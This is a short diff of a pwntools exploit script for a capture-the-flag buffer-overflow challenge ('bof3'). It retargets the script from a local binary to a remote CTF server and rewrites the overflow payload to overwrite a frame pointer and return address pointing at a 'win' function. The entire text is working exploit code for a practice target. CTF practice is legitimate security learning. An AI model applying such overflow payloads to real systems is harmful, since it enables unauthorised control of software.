@@ -1,20 +1,15 @@
 from pwn import *
 
 exe = context.binary = ELF('bof3')
-winaddr = exe.symbols['win']
-io = exe.process()
+winaddr = 0x8049256
+io = remote("ctf.hackucf.org", 9002)
 
+fram = 0x08049250
 payload = fit({
-    64: winaddr,
-    68: winaddr,
-    72: winaddr,
-    76: winaddr,
+    64: fram,
     80: winaddr,
-    84: winaddr,
-    88: winaddr,
-    92: winaddr,
 
 })
 
 io.sendline(payload)
-io.interactive()
+print(io.recvline())
